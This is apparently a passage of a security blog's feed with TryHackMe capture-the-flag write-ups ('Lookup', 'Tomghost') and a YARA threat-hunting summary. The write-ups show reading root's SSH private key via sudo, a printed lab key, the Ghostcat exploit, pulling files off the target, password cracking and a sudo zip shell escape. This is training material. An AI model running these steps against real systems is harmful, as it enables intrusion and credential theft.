(sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])&lt;br&gt;Cost 1 (iteration count) is 5000 for all loaded hashes&lt;br&gt;Will run 2 OpenMP threads&lt;br&gt;Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I left running JohnTheRipper (JTR) for a very long time, it was not finished yet and it did not find the password. Usually, it&apos;s an indication that this is not the right way. Why can I say this? The box submission guidelines specify that every password that is meant to be cracked must finish around 5 minutes of the tool running. This is a uideline that HTB and THM follows.&lt;/p&gt;&lt;p&gt;Now after spending a little time, I figured out that I can try to read the SSH id_rsa file to log as &lt;i&gt;root&lt;/i&gt; without the need for a password. Let&apos;s try this! The path where the &lt;i&gt;id_rsa&lt;/i&gt; is usually stored is &lt;i&gt;[userhome]/.ssh/id_rsa&lt;/i&gt; in this case the home is &lt;i&gt;/root&lt;/i&gt; so the full path would be &lt;i&gt;/root/.ssh/id_rsa&lt;/i&gt; if it exists.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;&lt;b&gt;think@lookup&lt;/b&gt;:~$ LFILE=/root/.ssh/id_rsa&lt;br&gt;&lt;b&gt;think@lookup&lt;/b&gt;:~$ sudo look &apos;&apos; &quot;$LFILE&quot;&lt;br&gt;[sudo] password for think: &lt;br&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;br&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;br&gt;NhAAAAAwEAAQAAAYEAptm2+DipVfUMY+7g9Lcmf/h23TCH7qKRg4Penlti9RKW2XLSB5wR&lt;br&gt;Qcqy1zRFDKtRQGhfTq+YfVfboJBPCfKHdpQqM/zDb//ZlnlwCwKQ5XyTQU/vHfROfU0pnR&lt;br&gt;j7eIpw50J7PGPNG7RAgbP5tJ2NcsFYAifmxMrJPVR/+ybAIVbB+ya/D5r9DYPmatUTLlHD&lt;br&gt;bV55xi6YcfV7rjbOpjRj8hgubYgjL26BwszbaHKSkI+NcVNPmgquy5Xw8gh3XciFhNLqmd&lt;br&gt;ISF9fxn5i1vQDB318owoPPZB1rIuMPH3C0SIno42FiqFO/fb1/wPHGasBmLzZF6Fr8/EHC&lt;br&gt;4wRj9tqsMZfD8xkk2FACtmAFH90ZHXg5D+pwujPDQAuULODP8Koj4vaMKu2CgH3+8I3xRM&lt;br&gt;hufqHa1+Qe3Hu++7qISEWFHgzpRMFtjPFJEGRzzh2x8F+wozctvn3tcHRv321W5WJGgzhd&lt;br&gt;k5ECnuu8Jzpg25PEPKrvYf+lMUQebQSncpcrffr9AAAFiJB/j92Qf4/dAAAAB3NzaC1yc2&lt;br&gt;EAAAGBAKbZtvg4qVX1DGPu4PS3Jn/4dt0wh+6ikYOD3p5bYvUSltly0gecEUHKstc0RQyr&lt;br&gt;UUBoX06vmH1X26CQTwnyh3aUKjP8w2//2ZZ5cAsCkOV8k0FP7x30Tn1NKZ0Y+3iKcOdCez&lt;br&gt;xjzRu0QIGz+bSdjXLBWAIn5sTKyT1Uf/smwCFWwfsmvw+a/Q2D5mrVEy5Rw21eecYumHH1&lt;br&gt;e642zqY0Y/IYLm2IIy9ugcLM22hykpCPjXFTT5oKrsuV8PIId13IhYTS6pnSEhfX8Z+Ytb&lt;br&gt;0Awd9fKMKDz2QdayLjDx9wtEiJ6ONhYqhTv329f8DxxmrAZi82Reha/PxBwuMEY/barDGX&lt;br&gt;w/MZJNhQArZgBR/dGR14OQ/qcLozw0ALlCzgz/CqI+L2jCrtgoB9/vCN8UTIbn6h2tfkHt&lt;br&gt;x7vvu6iEhFhR4M6UTBbYzxSRBkc84dsfBfsKM3Lb597XB0b99tVuViRoM4XZORAp7rvCc6&lt;br&gt;YNuTxDyq72H/pTFEHm0Ep3KXK336/QAAAAMBAAEAAAGBAJ4t2wO6G/eMyIFZL1Vw6QP7Vx&lt;br&gt;zdbJE0+AUZmIzCkK9MP0zJSQrDz6xy8VeKi0e2huIr0Oc1G7kA+QtgpD4G+pvVXalJoTLl&lt;br&gt;+K9qU2lstleJ4cTSdhwMx/iMlb4EuCsP/HeSFGktKH9yRJFyQXIUx8uaNshcca/xnBUTrf&lt;br&gt;05QH6a1G44znuJ8QvGF0UC2htYkpB2N7ZF6GppUybXeNQi6PnUKPfYT5shBc3bDssXi5GX&lt;br&gt;Nn3QgK/GHu6NKQ8cLaXwefRUD6NBOERQtwTwQtQN+n/xIs77kmvCyYOxzyzgWoS2zkhXUz&lt;br&gt;YZyzk8d2PahjPmWcGW3j3AU3A3ncHd7ga8K9zdyoyp6nCF+VF96DpZSpS2Oca3T8yltaR1&lt;br&gt;1fkofhBy75ijNQTXUHhAwuDaN5/zGfO+HS6iQ1YWYiXVZzPsktV4kFpKkUMklC9VjlFjPi&lt;br&gt;t1zMCGVDXu2qgfoxwsxRwknKUt75osVPN9HNAU3LVqviencqvNkyPX9WXpb+z7GUf7FQAA&lt;br&gt;AMEAytl5PGb1fSnUYB2Q+GKyEk/SGmRdzV07LiF9FgHMCsEJEenk6rArffc2FaltHYQ/Hz&lt;br&gt;w/GnQakUjYQTNnUIUqcxC59SvbfAKf6nbpYHzjmWxXnOvkoJ7cYZ/sYo5y2Ynt2QcjeFxn&lt;br&gt;vD9I8ACJBVQ8LYUffvuQUHYTTkQO1TnptZeWX7IQml0SgvucgXdLekMNu6aqIh71AoZYCj&lt;br&gt;rirB3Y5jjhhzwgIK7GNQ7oUe9GsErmZjD4c4KueznC5r+tQXu3AAAAwQDWGTkRzOeKRxE/&lt;br&gt;C6vFoWfAj3PbqlUmS6clPOYg3Mi3PTf3HyooQiSC2T7pK82NBDUQjicTSsZcvVK38vKm06&lt;br&gt;K6fle+0TgQyUjQWJjJCdHwhqph//UKYoycotdP+nBin4x988i1W3lPXzP3vNdFEn5nXd10&lt;br&gt;5qIRkVl1JvJEvrjOd+0N2yYpQOE3Qura055oA59h7u+PnptyCh5Y8g7O+yfLdw3TzZlR5T&lt;br&gt;DJC9mqI25np/PtAKNBEuDGDGmOnzdU47sAAADBAMeBRAhIS+rM/ZuxZL54t/YL3UwEuQis&lt;br&gt;sJP2G3w1YK7270zGWmm1LlbavbIX4k0u/V1VIjZnWWimncpl+Lhj8qeqwdoAsCv1IHjfVF&lt;br&gt;dhIPjNOOghtbrg0vvARsMSX5FEgJxlo/FTw54p7OmkKMDJREctLQTJC0jRRRXhEpxw51cL&lt;br&gt;3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0&lt;br&gt;DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==&lt;br&gt;-----END OPENSSH PRIVATE KEY-----&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/lookup/jackpot.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;The last this to do is to copy the key and paste on my local kali in a file name id_rsa to attempt to log in with SSH as root, &lt;code&gt;ssh -i ./id_rsa root@10.10.159.232&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ ssh -i ./id_rsa root@10.10.159.232&lt;br&gt;Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)&lt;br&gt;&lt;br&gt; * Documentation:  https://help.ubuntu.com&lt;br&gt; * Management:     https://landscape.canonical.com&lt;br&gt; * Support:        https://ubuntu.com/advantage&lt;br&gt;&lt;br&gt;  System information as of Thu 30 Jan 2025 04:59:02 PM UTC&lt;br&gt;&lt;br&gt;  System load:  0.0               Processes:             132&lt;br&gt;  Usage of /:   59.7% of 9.75GB   Users logged in:       1&lt;br&gt;  Memory usage: 11%               IPv4 address for ens5: 10.10.159.232&lt;br&gt;  Swap usage:   0%&lt;br&gt;&lt;br&gt;&lt;br&gt;Expanded Security Maintenance for Applications is not enabled.&lt;br&gt;&lt;br&gt;7 updates can be applied immediately.&lt;br&gt;To see these additional updates run: apt list --upgradable&lt;br&gt;&lt;br&gt;Enable ESM Apps to receive additional future security updates.&lt;br&gt;See https://ubuntu.com/esm or run: sudo pro status&lt;br&gt;&lt;br&gt;&lt;br&gt;The list of available updates is more than a week old.&lt;br&gt;To check for new updates run: sudo apt update&lt;br&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;br&gt;&lt;br&gt;&lt;br&gt;Last login: Mon May 13 10:00:24 2024 from 192.168.14.1&lt;br&gt;&lt;b style=&apos;color:red&apos;&gt;root@lookup&lt;/b&gt;:~# whoami&lt;br&gt;root&lt;br&gt;&lt;b style=&apos;color:red&apos;&gt;root@lookup&lt;/b&gt;:~# cat root.txt&lt;br&gt;5a285a9f257e45c68bb6c9f9f57d18e8&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;</content>
        
          <category term="hydra"/>
        
          <category term="bruteforcing"/>
        
          <category term="easy"/>
        
          <category term="linux password"/>
        
          <category term="box"/>
        
          <category term="thm"/>
        
          <category term="web"/>
        
          <category term="python"/>
        
          <category term="user enumeration"/>
        
          <category term="elfinder 2.1.47"/>
        
          <category term="linux"/>
        
          <category term="privesc"/>
        
          <category term="ssh"/>
        
          <category term="dictionary attack"/>
        
          <category term="cve"/>
        
          <category term="login panel"/>
        
          <category term="nc"/>
        
          <category term="php"/>
        
          <category term="rce"/>
        
          <category term="reverse shell"/>
        
      </item>
    
      <item>
        <title>Tomghost</title>
        <link href="https://benwick921.github.io/cyber/writeup/tomghost/" rel="alternate" type="text/html" title="Tomghost"/>
        <guid>https://benwick921.github.io/cyber/writeup/tomghost/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/tomghost/banner.gif&quot; alt=&quot;&quot;&gt;&lt;p&gt;&lt;pre&gt;Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 09:30 EST&lt;br&gt;Nmap scan report for 10.10.26.184&lt;br&gt;Host is up (0.027s latency).&lt;br&gt;Not shown: 996 closed tcp ports (conn-refused)&lt;br&gt;PORT     STATE SERVICE    VERSION&lt;br&gt;22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)&lt;br&gt;| ssh-hostkey: &lt;br&gt;|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)&lt;br&gt;|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)&lt;br&gt;|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)&lt;br&gt;53/tcp   open  tcpwrapped&lt;br&gt;8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)&lt;br&gt;| ajp-methods: &lt;br&gt;|_  Supported methods: GET HEAD POST OPTIONS&lt;br&gt;8080/tcp open  http       Apache Tomcat 9.0.30&lt;br&gt;|_http-title: Apache Tomcat/9.0.30&lt;br&gt;|_http-favicon: Apache Tomcat&lt;br&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;br&gt;&lt;br&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;br&gt;Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I have four services: port 22 SSH, 53 TCP wrapper, 8009 AJP13 (Apache Jsever), and 8080 Tomcat. The next step is to enumerate each of them with lots of patient.&lt;/p&gt;&lt;p&gt;Due to my past experience with Tomcat vulnerabilities, I assumed it was the same challenge: bypassing the admin panel and uploading a web shell to access the server. Big mistake!&lt;/p&gt;&lt;p&gt;Due to this wrong assumption, I started enumerating Tomcat port 8080 and discovered that the admin panel was disabled from the configuration file. For some reason, I was fixated on the idea that the vulnerability was in the Tomcat service and from the enumerating phase I slid into the exploitation phase without even noticing. Second big mistake!&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/bigmistake.jpg&quot;&gt;&lt;/p&gt;&lt;p&gt;Luckily I took a break and after clearing my mind I decided to proceed with the second service starting from the bottom up. The next service is port 8009 Apache Jserver. What I usually do is use &lt;a href=&quot;https://book.hacktricks.wiki/en/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.html?highlight=8009#8009---pentesting-apache-jserv-protocol-ajp&quot;&gt;HackTricks&lt;/a&gt; for the enumeration phase and it describes a vulnerability named Ghostcat, the same as the challenges banner. Fantastic!&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/yes.jpg&quot;&gt;&lt;/p&gt;&lt;p&gt;At this point, I stopped the enumeration phase and proceeded with the exploitation phase as there is a public CVE to use.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/earchsploit.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;I tend to avoid using Metasploit as a simulation of different certifications where the tool is banned or limited, for this reason, I used the first option &lt;i&gt;48143.py&lt;/i&gt; and trained manual exploitation.&lt;/p&gt;&lt;p&gt;Note that even if I stopped the enumeration phase and skipped port 22 and port 53 this is the wrong way to approach boxes, it is always suggested to complete the enumeration phase as none guarantees that the exploit I found is going to work, be aware of rabbit holes! Always always complete your enumeration at your best!&lt;/p&gt;&lt;p&gt;First, this to do is to copy the exploit and open it to understand what it is doing. This is crucial, especially in real-life penetration testing where there is a risk of introducing vulnerabilities or causing unintentional damage to the server, especially if you testing the production server!&lt;/p&gt;&lt;p&gt;&lt;code&gt;searchsploit -m 48143.py&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Once opened the Python file, at the bottom of the file, which usually is the starting point (main) of the program I can see what is required to run it and what arguments it takes.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/cvecode.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;It becomes clear that there are 2 parameters set by default: the port and the file to extract,  the only parameter I have to provide is the remote IP address. This script must be run with Python2 otherwise it generates an error as starting from Python3 some library has changes and its syntax.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;chmod +x 48143.py&lt;br&gt;python2 ./48143.py [target.ip.address]&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/cred.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;Now we have a credential, what is it for? ssh maybe? Let&apos;s try the following command: &lt;code&gt;ssh skyfuck@[target.ip.address]&lt;/code&gt; and as a passowrd use the one from the extracted file.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/remoteshell.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/imin.png&quot;&gt;&lt;/p&gt;&lt;p&gt;The user flag is in the &lt;b&gt;merlin&lt;/b&gt; home directory&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/userflag.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;Once inside I listed the files in the current directory (home directory of skyfuck) and saw a pgp file named credential and a public key (.asc). Thanks to other CTFs I did in past I knew how to deal with these files. The foremost thing to do is to crack the passphrase from the encrypted (tryhackme.asc) file and use that to decrypt &lt;i&gt;credential.pgp&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;Remember that in this case, I am again skipping the whole enumeration of the system as I was presented with those 2 files, and my plan was to proceede with complete enumeration in the even the decryption attemps fails and it is a rabbit hole.&lt;/p&gt;&lt;p&gt;Before attempting to crack the password, I must download the files, as the necessary tools may not be installed on the target machine. For this reason, I opened a Python web server on the target machine, downloaded the necessary files, and performed the cracking on my local machine.&lt;/p&gt;&lt;p&gt;On the target machine:&lt;/p&gt;&lt;p&gt;&lt;pre&gt;python3 -m http.server&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/webserver.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;On my local Kali machine:&lt;/p&gt;&lt;p&gt;&lt;pre&gt;wget http://[target.ip.address]:8000/credential.pgp&lt;br&gt;wget http://[target.ip.address]:8000/tryhackme.asc&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/download.png&quot;&gt;&lt;/p&gt;&lt;p&gt;To decrypt the tryhackme.asc file I have to use &lt;b&gt;pgp2john&lt;/b&gt; to extract the hash and then use &lt;b&gt;JohnTheRipper&lt;/b&gt; to crack it.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;pgp2john tryhackme.asc &gt; hash&lt;br&gt;john --wordlist=/user/share/wordlist/rockyou.txt hash&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/cracked.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;Next step is to import the &lt;i&gt;tryhackme.asc&lt;/i&gt; file: &lt;code&gt;gpg --import tryhackme.asc&lt;/code&gt; when prompterd enter the phassphrase &lt;i&gt;alexandru&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/importkey.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;Now decryt the file as: &lt;code&gt;gpg --recipient &quot;John Doe &amp;lt;john.doe@example.com&amp;gt;&quot; --output decrypted_file.txt --decrypt credential.pgp&lt;/code&gt; and when prompted enter the passphrase.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/passphrase.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/decryption.png&quot;&gt;&lt;/p&gt;&lt;p&gt;Now this is the ssh credential for &lt;i&gt;merlin&lt;/i&gt; account, and similarly, we can log in to &lt;i&gt;merlin&lt;/i&gt; and try to elevate our privilege. This is also a sort of lateral movement. The reason why I had to change account it is because as &lt;i&gt;skyfuck&lt;/i&gt; user I am not able to elevate my privilege due to its restriction in the system, on the other hand &lt;i&gt;merlin&lt;/i&gt; is not as restricted as &lt;i&gt;skyfuck&lt;/i&gt; leaving the possibility to compromise the system.&lt;/p&gt;&lt;p&gt;Log in as &lt;i&gt;merlin&lt;/i&gt;: &lt;code&gt;ssh merlin@[target.ip.address]&lt;/code&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/merlin.PNG&quot;&gt;&lt;/p&gt;&lt;p&gt;Upon log in I can see that &lt;i&gt;melin&lt;/i&gt; account can run &lt;i&gt;/usr/bin/zip&lt;/i&gt; as &lt;b&gt;root&lt;/b&gt;, and to check if it is exploitable I used &lt;a href=&quot;https://gtfobins.github.io/gtfobins/zip/&quot;&gt;gtfobin&lt;/a&gt; and searched for &lt;b&gt;zip&lt;/b&gt;. Among the different solutions, I chose the sudo one as the user merlin can execute it with sudo privilege, so I am executing in order the following 2 commands:&lt;/p&gt;&lt;p&gt;&lt;pre&gt;TF=$(mktemp -u)&lt;br&gt;sudo zip $TF /etc/hosts -T -TT &apos;sh #&apos;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/tomghost/root.PNG&quot;&gt;&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="ctf"/>
        
          <category term="oscp"/>
        
          <category term="box"/>
        
          <category term="thm"/>
        
          <category term="cve"/>
        
          <category term="ssh"/>
        
          <category term="bruteforcing"/>
        
          <category term="python webserver"/>
        
          <category term="download file"/>
        
          <category term="privesc"/>
        
          <category term="pgp public key cracking"/>
        
      </item>
    
      <item>
        <title>Threat Hunting With YARA</title>
        <link href="https://benwick921.github.io/cyber/writeup/threat-hunting-with-yara/" rel="alternate" type="text/html" title="Threat Hunting With YARA"/>
        <guid>https://benwick921.github.io/cyber/writeup/threat-hunting-with-yara/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/threathuntingwithyara/banner.gif&quot; alt=&quot;&quot;&gt;&lt;p&gt;This is a summary of the room &lt;em&gt;Threat Hunting with YARA&lt;/em&gt; on Try Hack Me&lt;/p&gt;&lt;p&gt;&lt;ul&gt;&lt;li&gt;Looking for actionable information that can be used to search for threats&lt;/li&gt;&lt;li&gt;Installing YARA&lt;/li&gt;&lt;li&gt;Creating a YARA rule&lt;/li&gt;&lt;li&gt;Deploying a YARA rule&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&lt;p&gt;&lt;ul&gt;&lt;li&gt;Basic understanding of security concepts including but not limited to Cyber Kill Chain, TTPs, Indicator of Compromise, Hashes, and APTs.&lt;/li&gt;&lt;li&gt;Basic understanding of using the Windows command line and PowerShell.&lt;/li&gt;&lt;li&gt;Basic understanding of data types and encoding.&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/B&gt;&lt;i&gt; What technique does ID T1134 describe?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;Access Token Manipulation&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/b&gt; &lt;i&gt;What does the detection rule M_APT_Dropper_Rootsaw_Obfuscated detect?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;Detects obfuscated ROOTSAW payloads&lt;/i&gt;&lt;/p&gt;&lt;p&gt;There are mainly 3 types of Threat Hunting: Structured, Unstructured and Situational and they employed depending on the situation.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/threathuntingwithyara/2b3ab1f4cb664f8d86e450d8dac29909.png&quot;&gt;&lt;/p&gt;&lt;p&gt;This approach starts with a plan or hypothesis based on known attacker behaviors and strategies. You’re looking for specific patterns or signs that show an attack might be starting.&lt;/p&gt;&lt;p&gt;How it works:&lt;/p&gt;&lt;p&gt;&lt;ul&gt;&lt;li&gt;Searches are powered by tools like YARA rules (to find patterns) or queries in a SIEM (to analyze logs).&lt;/li&gt;&lt;li&gt;Relies on external sources, like ecurity blogs or platforms that share attack details (e.g., MISP or AlienVault).&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&lt;p&gt;Why it’s useful:&lt;/p&gt;&lt;p&gt;&lt;ul&gt;&lt;li&gt;It’s good for investigating after a possible compromise or when new threats are reported.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Example:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;List itemFinding alware on a server after reading a blog about a similar attack.&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&lt;p&gt;This combines the first two approaches and focuses on what’s relevant right now for your organization. It responds to new threats or specific situations, like industry-specific risks or targeted reports.&lt;/p&gt;&lt;p&gt;How it works:&lt;/p&gt;&lt;p&gt;&lt;ul&gt;&lt;li&gt;Starts with a hypothesis about who might attack and what they’ll target.&lt;/li&gt;&lt;li&gt;Focuses on protecting your most critical assets (e.g., financial data or customer info).&lt;/li&gt;&lt;li&gt;Uses tools like the MITRE ATT&amp;amp;CK framework and past attack data.&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&lt;p&gt;Why it’s good:&lt;/p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;List itemIt adapts to current threats, making it highly focused and relevant.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Example:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;If your industry is being targeted by a ransomware group, you look for signs of their activity in your systems.&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/threathuntingwithyara/939f0f2ec8f84feb9ff6d25823dd5d5e.png&quot;&gt;&lt;/p&gt;&lt;p&gt;This is what starts the hunt for a security threat. A trigger could be:&lt;/p&gt;&lt;p&gt;&lt;ul&gt;&lt;li&gt;A warning sign, like a suspicious file (IOC).&lt;/li&gt;&lt;li&gt;A known behavior or method used by attackers (TTPs).&lt;/li&gt;&lt;li&gt;An educated guess (hypothesis).&lt;/li&gt;&lt;li&gt;A system acting strangely.&lt;/li&gt;&lt;li&gt;Information from blogs, news, or reports from other companies.&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&lt;p&gt;Once you pick a trigger, you use it to start searching for problems.&lt;/p&gt;&lt;p&gt;&lt;ul&gt;&lt;li&gt;List itemSecurity experts use tools like malware scanners, network tools (e.g., Wireshark), or rules (like YARA) to find anything unusual in the systems or files.&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&lt;p&gt;If evidence of a security breach is found:&lt;/p&gt;&lt;p&gt;&lt;ul&gt;&lt;li&gt;The incident response (IR) team is informed to handle the problem.&lt;/li&gt;&lt;li&gt;The threat hunter may help the IR team investigate further, find the root cause, and figure out how bad the damage is.&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&lt;p&gt;How to apply the above scenarios:&lt;/p&gt;&lt;p&gt;Example: The received threat intelligence details specific TTPs attributed to APT29, which is known to target political entities. This intelligence enables a structured hunting style using the TTPs included in the report to build a hypothesis.&lt;/p&gt;&lt;p&gt;Example: The received threat intel includes Indicators of Compromise and YARA rules to hunt for malware. This intelligence enables an unstructured hunting style using the IOCs provided.&lt;/p&gt;&lt;p&gt;The two opportunities above can be combined to enable a situational or entity-driven hunting style.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/b&gt; &lt;i&gt;Which threat hunting style is proactive and uses indicators of attack and TTPs?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;structured hunting&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/b&gt; &lt;i&gt;In which phase of the threat hunting process, tools like YARA or Volatility are used?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;Investigation&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/b&gt; &lt;i&gt;You have received a threat intelligence report consisting only of Indicators of Compromise. What threat hunting style do you recommend to use?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;unstructured hunting&lt;/i&gt;&lt;/p&gt;&lt;p&gt;YARA stands for Yet Another Ridiculous Acronym. It is a tool Victor Alvarez of VirusTotal developed to assist malware researchers in detecting and describing malware families. The main functionality of YARA is based on advanced pattern matching, explicitly tailored to malware. It can be best compared to using a supercharged grep with complex regular expressions in Linux. Just like the grep command, the YARA binary will iterate over all files in a designated path, trying to find a match with the information provided in the YARA rule. A YARA rule describes a malware family based on a pattern using a set of strings and Boolean logic.&lt;/p&gt;&lt;p&gt;Yara rules are compsed by &lt;strong&gt;name&lt;/strong&gt;, &lt;strong&gt;meta&lt;/strong&gt;, &lt;strong&gt;strings&lt;/strong&gt;, and &lt;strong&gt;condition&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Rule Name&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The Rule name is a descriptive name for the rule and starts with the keyword rule. Best practices include setting a name that clarifies what the rule is used for.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Meta&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;This part defines extra information like description, author, and more. Custom identifiers and value pairs can be freely created. The information defined in meta cannot be used in the condition part. Whether to include this part or not is entirely up to you. The rule will work completely fine without it. It is, however, recommended to include the meta part with some basic information, including the author and the description of what to use the rule for.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Strings&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;In this part of the rule, matching strings are defined. Multiple types of strings can be defined, which is essential for creating functional rules.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Condition&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;In this part of the rule, a matching condition is defined using the identifiers defined in the strings part.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Rule name&lt;/strong&gt;: M_APT_Dropper_Rootsaw_Obfuscated. The rule’s title is well-chosen and gives the user a good idea of what to use it for. In this case, it is to detect a dropper called Rootsaw that is obfuscated.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Meta&lt;/strong&gt;: It is good practice to include relevant data that provides more information about the rule. This helps the user of the YARA rule know what to use the rule for, who wrote it, and where to apply it.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Strings&lt;/strong&gt;: The strings included in this example help the user find a file containing those strings. How do malware analysts choose those strings? They analyze the malware and determine what uniquely identifies it. The strings used are text strings. The first two lines are straightforward.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Condition&lt;/strong&gt;: This rule requires that all defined strings be present to have a match. This means all the strings defined in part 3 must have a match in the same file being matched against.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/threathuntingwithyara/093256bb495d401999c533781793f3ce.png&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/b&gt; &lt;i&gt;Apart from the rule name, which other section is also required in a YARA rule?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;condition&lt;/i&gt;&lt;/p&gt;&lt;p&gt;An important part of threat hunting is avoiding false alarms. With YARA, this means writing rules that accurately detect the specific threat. However, writing good YARA rules can be tricky and complicated, especially for specific malware. You have two 